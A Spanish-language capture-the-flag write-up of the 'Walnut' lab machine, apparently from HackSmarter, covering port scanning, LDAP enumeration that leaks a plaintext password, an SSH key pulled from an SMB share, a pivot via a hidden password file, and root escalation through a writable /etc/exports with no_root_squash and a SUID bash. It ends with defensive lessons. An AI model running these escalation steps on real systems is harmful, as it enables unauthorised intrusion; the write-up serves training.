# Writeup: Walnut (HackSmarter — Fácil)

Walnut es una máquina **Fácil** que simula un servidor Linux con múltiples servicios expuestos, incluyendo SSH, SMB (Samba), LDAP y NFS. El recorrido comienza con un escenario de *Assumed Breach*, donde se nos proporcionan credenciales iniciales para el usuario `larryburns`. Aunque estas credenciales no funcionan directamente en SSH ni SMB, sí son válidas para LDAP. A través de una enumeración LDAP, se descubre la contraseña en texto plano del usuario `automation` almacenada en su descripción. Con esas credenciales, accedemos al recurso compartido SMB `automation`, donde encontramos una clave privada SSH que nos permite conectarnos como `automation`. Desde allí, analizamos un script de automatización que nos revela una contraseña oculta, lo que nos permite pivotar al usuario `localjob3`. Finalmente, abusamos de un permiso sudo mal configurado sobre NFS para escalar a `root` mediante una exportación con `no_root_squash`.

---

## Fase 1: Reconocimiento

Realizamos un escaneo completo de puertos con Nmap:

```bash
sudo nmap -sS --min-rate 500 -p- -Pn -n -vv 10.1.249.133 -oG allPorts
```

**Resultado:**

```
PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 62
111/tcp   open  rpcbind      syn-ack ttl 62
139/tcp   open  netbios-ssn  syn-ack ttl 62
389/tcp   open  ldap         syn-ack ttl 62
445/tcp   open  microsoft-ds syn-ack ttl 62
2049/tcp  open  nfs          syn-ack ttl 62
35725/tcp open  unknown      syn-ack ttl 62
37349/tcp open  unknown      syn-ack ttl 62
50795/tcp open  unknown      syn-ack ttl 62
53679/tcp open  unknown      syn-ack ttl 62
56941/tcp open  unknown      syn-ack ttl 62
```

**Explicación de parámetros:**

- `-sS`: Escaneo SYN (sigiloso).
- `--min-rate 500`: Envía al menos 500 paquetes por segundo.
- `-p-`: Escanea todos los 65535 puertos.
- `-Pn`: Omite el descubrimiento de hosts.
- `-n`: Omite la resolución DNS.
- `-vv`: Verbosidad aumentada.
- `-oG allPorts`: Guarda la salida en formato "grepable".

Realizamos un escaneo de servicios y versiones:

```bash
nmap -sCV -p 22,111,139,389,445,2049,35725,37349,50795,53679,56941 10.1.249.133 -oN targeted
```

**Resultados clave:**

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 4
389/tcp   open  ldap        OpenLDAP 2.2.X - 2.3.X
445/tcp   open  netbios-ssn Samba smbd 4
2049/tcp  open  nfs         3-4 (RPC #100003)
35725/tcp open  mountd      1-3 (RPC #100005)
37349/tcp open  nlockmgr    1-4 (RPC #100021)
50795/tcp open  mountd      1-3 (RPC #100005)
53679/tcp open  mountd      1-3 (RPC #100005)
56941/tcp open  status      1 (RPC #100024)
```

**Observaciones clave:**

- **Puerto 22 (SSH)**: OpenSSH en Ubuntu.
- **Puerto 389 (LDAP)**: OpenLDAP.
- **Puerto 445 (SMB)**: Samba.
- **Puerto 2049 (NFS)**: Servicio NFS, con varios puertos `mountd` asociados.
- **Hostname NetBIOS**: `WALNUT`.

Añadimos el dominio al archivo `/etc/hosts`:

```bash
echo "10.1.249.133 walnut.local WALNUT" | sudo tee -a /etc/hosts
```

### Enumeración de exportaciones NFS

```bash
showmount -e walnut.local
```

**Resultado:**

```
Export list for walnut.local:
```

No hay exportaciones NFS visibles inicialmente, lo que indica que el servicio está activo pero sin recursos compartidos accesibles de forma anónima.

---

## Fase 2: Validación de credenciales iniciales

Se nos proporcionan credenciales para un escenario *Assumed Breach*:

- **Usuario**: `larryburns`
- **Contraseña**: `IloveMontgommery!`

Probamos estas credenciales contra SSH:

```bash
nxc ssh walnut.local -u 'Larryburns' -p 'IloveMontgommery!'
```

**Resultado:**

```
SSH         10.1.249.133    22     walnut.local     [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.18
SSH         10.1.249.133    22     walnut.local     [-] Larryburns:IloveMontgommery!
```

Las credenciales **no funcionan** para SSH.

Probamos contra SMB:

```bash
nxc smb walnut.local -u 'Larryburns' -p 'IloveMontgommery!' --shares
```

**Resultado:**

```
SMB         10.1.249.133    445    WALNUT           [*] Unix - Samba (name:WALNUT) (domain:local) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.1.249.133    445    WALNUT           [+] local\Larryburns:IloveMontgommery! (Guest)
SMB         10.1.249.133    445    WALNUT           [*] Enumerated shares
SMB         10.1.249.133    445    WALNUT           Share           Permissions     Remark
SMB         10.1.249.133    445    WALNUT           -----           -----------     ------
SMB         10.1.249.133    445    WALNUT           print$                          Printer Drivers
SMB         10.1.249.133    445    WALNUT           automation                      automation share
SMB         10.1.249.133    445    WALNUT           IPC$                            IPC Service (walnut server (Samba, Ubuntu))
```

Aunque la autenticación SMB es aceptada como **Guest**, no tenemos permisos de lectura/escritura en ningún recurso.

Probamos contra **LDAP**, donde sí funcionan:

```bash
ldapsearch -x -H ldap://10.1.249.133 \
  -D 'uid=larryburns,ou=People,dc=walnut,dc=local' \
  -w 'IloveMontgommery!' -s base -b '' -LLL namingContexts
```

**Resultado:**

```
dn:
namingContexts: dc=walnut,dc=local
```

**Explicación:** El comando `ldapsearch` se conecta al servidor LDAP y realiza una búsqueda. Los parámetros utilizados son:

- `-x`: Autenticación simple.
- `-H ldap://10.1.249.133`: URL del servidor LDAP.
- `-D`: DN del usuario para autenticarse.
- `-w`: Contraseña del usuario.
- `-s base -b ''`: Búsqueda base en la raíz del directorio.
- `-LLL`: Formato de salida LDIF sin comentarios.
- `namingContexts`: Atributo que devuelve los contextos de nombres disponibles.

Las credenciales de `larryburns` son válidas para LDAP, lo que confirma que el usuario existe en el directorio.

---

## Fase 3: Enumeración LDAP

Volcamos todo el contenido del directorio LDAP:

```bash
ldapsearch -x -H ldap://10.1.249.133 \
  -D 'uid=larryburns,ou=People,dc=walnut,dc=local' \
  -w 'IloveMontgommery!' \
  -b 'dc=walnut,dc=local' -LLL '(objectClass=*)' | tee dump.ldif
```

**Resultado relevante:**

```
dn: uid=automation,ou=People,dc=walnut,dc=local
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: automation
sn: automation
givenName: automation
cn: automation
displayName: automation
uidNumber: 7789
gidNumber: 7789
gecos: automation
loginShell: /bin/bash
homeDirectory: /home/automation
description: old pw asdh023incasdahff9 please change pw on all servers

dn: uid=larryburns,ou=People,dc=walnut,dc=local
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: larryburns
sn: Burns
givenName: Larry
cn: larryburns
displayName: larryburns
uidNumber: 1001
gidNumber: 1001
gecos: Larry Burns
loginShell: /bin/bash
homeDirectory: /home/larryburns
userPassword:: e1NTSEF9amdUN0V4SEtocDVDQm92clBaYzhMYkJiNXVwK1JNcUI=
```

**Hallazgo crítico:** El usuario `automation` tiene en su atributo `description` una contraseña en texto plano:

```
description: old pw asdh023incasdahff9 please change pw on all servers
```

**Explicación:** El atributo `description` de LDAP está destinado a descripciones generales del usuario. Almacenar contraseñas (incluso si se etiquetan como "antiguas") en este atributo es una vulnerabilidad grave de exposición de información.

### Verificación del hash de `larryburns`

El hash de `larryburns` está codificado en Base64. Lo decodificamos:

```bash
echo 'e1NTSEF9amdUN0V4SEtocDVDQm92clBaYzhMYkJiNXVwK1JNcUI=' | base64 -d
```

**Resultado:**

```
{SSHA}jgT7ExHKhp5CBovrPZc8LbBb5up+RMqB
```

Es un hash **SSHA** (Salted SHA-1). Escribimos un pequeño script en Python para verificar si la contraseña `IloveMontgommery!` coincide con el hash:

```python
import base64, hashlib
blob = base64.b64decode('jgT7ExHKhp5CBovrPZc8LbBb5up+RMqB')
digest, salt = blob[:20], blob[20:]
print(hashlib.sha1(b'IloveMontgommery!' + salt).digest() == digest)
```

**Resultado:**

```
True
```

**Explicación:** El script decodifica el hash, separa el digest (20 bytes) del salt, y calcula el hash SHA-1 de la contraseña concatenada con el salt. Si coincide, la contraseña es correcta. Confirmamos que la contraseña de `larryburns` es `IloveMontgommery!`.

---

## Fase 4: Acceso como `automation`

Probamos las credenciales de `automation` en los servicios:

**SSH:**

```bash
nxc ssh walnut.local -u 'automation' -p 'asdh023incasdahff9'
```

**Resultado:**

```
SSH         10.1.249.133    22     walnut.local     [-] automation:asdh023incasdahff9
```

No funciona para SSH.

**SMB:**

```bash
nxc smb walnut.local -u 'automation' -p 'asdh023incasdahff9' --shares
```

**Resultado:**

```
SMB         10.1.249.133    445    WALNUT           [+] local\automation:asdh023incasdahff9
SMB         10.1.249.133    445    WALNUT           Share           Permissions     Remark
SMB         10.1.249.133    445    WALNUT           -----           -----------     ------
SMB         10.1.249.133    445    WALNUT           print$          READ            Printer Drivers
SMB         10.1.249.133    445    WALNUT           automation      READ,WRITE      automation share
SMB         10.1.249.133    445    WALNUT           IPC$                            IPC Service (walnut server (Samba, Ubuntu))
```

Las credenciales son válidas para SMB, y tenemos permisos de **READ, WRITE** en el recurso `automation`.

### Exploración del recurso SMB `automation`

```bash
smbclient //walnut.local/automation -U 'automation%asdh023incasdahff9'
```

```bash
smb: \> ls
  .                                   D        0  Sun Sep 20 19:17:25 2026
  ..                                  D        0  Sun Sep 20 19:17:25 2026
  .bash_history                       H       10  Sun Aug 30 09:04:58 2026
  scripts                             D        0  Thu Sep 18 16:28:59 2025
  .ssh                               DH        0  Fri Sep 19 09:39:26 2025
  .hidden                            DH        0  Thu Sep 18 15:22:44 2025
  .cache                             DH        0  Thu Sep 18 09:38:52 2025
  .lesshst                            H       20  Thu Sep 18 15:24:25 2025
  user.txt                            N       33  Sun Aug 30 08:53:47 2026
  .viminfo                            H    11817  Thu Sep 18 16:28:59 2025
```

En el directorio `.ssh` encontramos una clave privada SSH:

```bash
smb: \.ssh\> ls
  id_rsa.pub                          N      576  Thu Sep 18 09:12:15 2025
  id_rsa                              N     2610  Thu Sep 18 09:12:15 2025
  authorized_keys                     N      576  Fri Sep 19 09:39:26 2025

smb: \.ssh\> get id_rsa
```

**Hallazgo:** Obtenemos la clave privada SSH de `automation`.

### Conexión SSH con la clave privada

```bash
ssh -i id_rsa automation@walnut.local
```

**Resultado:**

```bash
automation@walnut:~$ id
uid=7789(automation) gid=7789(automation) groups=7789(automation)
```

Accedemos como `automation`.

---

## Fase 5: Análisis del script de automatización

En el directorio `scripts` de `automation` encontramos un script llamado `runScript.sh`:

```bash
cat runScript.sh
```

```bash
#!/bin/bash

PARM1="$1"
PARM2=`echo -n "$1" | md5sum | cut -d' ' -f 1`
PARM3="$2"
DATE=`date +%d.%m.%Y-%Hh%m.%S`

su - "$PARM1" -c "$PARM3" < /home/automation/.hidden/"$PARM2" > /home/automation/scripts/logs/"$1"-"$DATE".log
```

**Análisis del script:**

- `PARM1="$1"`: Primer argumento (nombre de usuario).
- `PARM2`: Hash MD5 del primer argumento.
- `PARM3="$2"`: Segundo argumento (comando a ejecutar).
- El script ejecuta `su - "$PARM1" -c "$PARM3"` usando el archivo `.hidden/$PARM2` como entrada estándar.

**El archivo `.hidden/<md5>` contiene la contraseña del usuario `PARM1`**, y el script la usa para autenticarse con `su`.

### Exploración del directorio `.hidden`

```bash
ls -la /home/automation/.hidden/
```

**Resultado:**

```
-rw------- 1 automation automation   21 Sep 18  2025 4f378611beed879f4f62a43ac18452a9
-rw------- 1 automation automation   21 Sep 18  2025 af5f60ab1fe78c4a34e37c9cb4cc58b8
-rw------- 1 automation automation   21 Sep 18  2025 b410af005ed0c033fd5e89720fdf2d57
-rw------- 1 automation automation    0 Sep 18  2025 b4d2ab0ea77f3306355ac7b2bcfcd614
-rw------- 1 automation automation   21 Sep 18  2025 b4d2ab0ea77f3306355ac7b2bcfcd614.bak
```

El archivo `b4d2ab0ea77f3306355ac7b2bcfcd614.bak` contiene una contraseña en texto plano:

```bash
cat .hidden/b4d2ab0ea77f3306355ac7b2bcfcd614.bak
```

**Resultado:**

```
vyZzRcreRGDjbq9t19Tb
```

### Identificación del usuario correspondiente

Listamos los usuarios del sistema:

```bash
ls /home
```

**Resultado:**

```
automation  localjob1  localjob2  localjob3  localjob4
```

Probamos la contraseña `vyZzRcreRGDjbq9t19Tb` con cada usuario:

```bash
su localjob1
# Authentication failure

su localjob2
# Authentication failure

su localjob3
# Success
```

**Resultado:**

```bash
localjob3@walnut:/home/automation$ id
uid=5002(localjob3) gid=5002(localjob3) groups=5002(localjob3),100(users)
```

Ahora somos el usuario **`localjob3`**.

---

## Fase 6: Escalada a root mediante NFS

### 6.1 Verificación de permisos sudo

```bash
sudo -l
```

**Resultado:**

```
Matching Defaults entries for localjob3 on walnut:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User localjob3 may run the following commands on walnut:
    (ALL) NOPASSWD: /usr/bin/systemctl restart nfs-kernel-server.service
```

**Hallazgo crítico:** `localjob3` puede ejecutar `systemctl restart nfs-kernel-server.service` como `root` sin contraseña. Esto nos permite **reiniciar el servicio NFS después de modificar su configuración**.

### 6.2 Verificación de permisos sobre `/etc/exports`

```bash
ls -la /etc/exports /etc/exports.d/ 2>/dev/null
getfacl /etc/exports
```

**Resultado:**

```
-rw-rw-r--+ 1 root root 390 Sep 19  2025 /etc/exports

# file: etc/exports
# owner: root
# group: root
user::rw-
user:localjob3:rw-
group::r--
mask::rw-
other::r--
```

**Hallazgo crítico:** El usuario `localjob3` tiene permisos de **escritura** sobre `/etc/exports` gracias a una ACL.

### 6.3 Enumeración de servicios RPC

```bash
rpcinfo -p | grep -E 'nfs|mountd'
```

**Resultado:**

```
    100005    1   udp  45725  mountd
    100005    1   tcp  51375  mountd
    100005    2   udp  44056  mountd
    100005    2   tcp  42953  mountd
    100005    3   udp  46413  mountd
    100005    3   tcp  58859  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
```

### 6.4 Modificación de `/etc/exports`

Añadimos una exportación maliciosa de `/tmp` con `no_root_squash`:

```bash
echo '/tmp *(rw,sync,no_subtree_check,no_root_squash,insecure)' >> /etc/exports
```

```bash
cat /etc/exports
```

**Resultado:**

```
/tmp *(rw,sync,no_subtree_check,no_root_squash,insecure)
```

**Explicación de las opciones:**

- `rw`: Lectura y escritura.
- `sync`: Las operaciones se escriben en disco antes de responder.
- `no_subtree_check`: Desactiva la verificación del subárbol (mejora el rendimiento).
- `no_root_squash`: **Crítico**. Por defecto, NFS mapea el usuario `root` del cliente al usuario `nobody` del servidor (root squash). Con `no_root_squash`, el usuario `root` del cliente **mantiene sus privilegios** en el servidor. Esto permite crear archivos con propietario `root` y bits SUID.
- `insecure`: Permite conexiones desde puertos no privilegiados.

### 6.5 Reinicio del servicio NFS

```bash
sudo /usr/bin/systemctl restart nfs-kernel-server.service
```

Verificamos la exportación:

```bash
showmount -e walnut.local
```

**Resultado:**

```
Export list for walnut.local:
/tmp *
```

### 6.6 Montaje de la exportación en Kali

Creamos un directorio de montaje y montamos la exportación:

```bash
sudo mkdir -p /mnt/walnut
sudo mount -t nfs -o vers=3,nolock 10.1.249.133:/tmp /mnt/walnut
```

### 6.7 Copia de `/bin/bash` y aplicación de SUID

En la máquina víctima (como `localjob3`):

```bash
cp /bin/bash /tmp/bash
```

En nuestra máquina Kali (como `root`), cambiamos el propietario y activamos el bit SUID:

```bash
sudo chown root:root /mnt/walnut/bash
sudo chmod 4755 /mnt/walnut/bash
```

**Explicación:** Debido a `no_root_squash`, los archivos creados desde el cliente NFS mantienen el propietario `root`. Al aplicar `chmod 4755`, activamos el bit **SUID**, lo que significa que cuando cualquier usuario ejecute `/tmp/bash`, se ejecutará con los privilegios del propietario (`root`).

### 6.8 Obtención de shell root

En la máquina víctima:

```bash
/tmp/bash -p
```

**Resultado:**

```bash
bash-5.2# id
uid=5002(localjob3) gid=5002(localjob3) euid=0(root) groups=5002(localjob3),100(users)
bash-5.2# whoami
root
```

Obtenemos una shell como **root**. La opción `-p` preserva los privilegios elevados al ejecutar `bash` con SUID.

---

## 📌 Conclusión

Walnut es una máquina **Fácil** que combina:

1. **Escenario Assumed Breach** con credenciales iniciales para `larryburns`.
2. **Enumeración LDAP** para descubrir la contraseña de `automation` en el atributo `description`.
3. **Acceso SMB** con las credenciales de `automation` y extracción de una clave privada SSH.
4. **Análisis de un script de automatización** (`runScript.sh`) que revela la existencia de un directorio `.hidden` con contraseñas.
5. **Extracción de una contraseña oculta** para pivotar al usuario `localjob3`.
6. **Abuso de permisos sudo** sobre `systemctl restart nfs-kernel-server.service`.
7. **Modificación de `/etc/exports`** para añadir una exportación con `no_root_squash`.
8. **Montaje NFS** desde Kali y creación de un binario SUID para escalar a `root`.

---

## 📚 Lecciones aprendidas

1. **Las credenciales nunca deben almacenarse en atributos LDAP**  
   El usuario `automation` tenía su contraseña almacenada en el atributo `description` de LDAP, visible para cualquier usuario con permisos de lectura sobre el directorio. Los atributos LDAP deben contener únicamente información no sensible.

2. **Los scripts de automatización pueden exponer credenciales**  
   El script `runScript.sh` utilizaba archivos ocultos en `.hidden/` que contenían contraseñas de usuarios. Aunque el directorio tenía permisos restrictivos, el propietario del script (`automation`) podía acceder a ellos. Las credenciales deben gestionarse mediante un gestor de secretos.

3. **Las ACLs sobre archivos críticos del sistema son peligrosas**  
   El usuario `localjob3` tenía permisos de escritura sobre `/etc/exports` a través de una ACL. Esto permitió modificar la configuración de NFS para añadir una exportación maliciosa. Los archivos de configuración críticos deben ser de solo lectura para usuarios no privilegiados.

4. **`no_root_squash` en NFS es una vulnerabilidad crítica**  
   Permitir que el usuario `root` del cliente mantenga sus privilegios en el servidor NFS permite crear archivos con propietario `root` y bits SUID, lo que resulta en una escalada de privilegios trivial.

5. **Los permisos sudo sobre `systemctl` deben restringirse estrictamente**  
   Permitir a un usuario reiniciar servicios críticos como `nfs-kernel-server` sin contraseña es peligroso, especialmente si el usuario puede modificar la configuración de esos servicios.

6. **La enumeración de servicios RPC es esencial**  
   La identificación de los puertos `mountd` y la verificación de las exportaciones NFS permitió descubrir que el servicio estaba activo y que podía ser manipulado a través de la configuración.

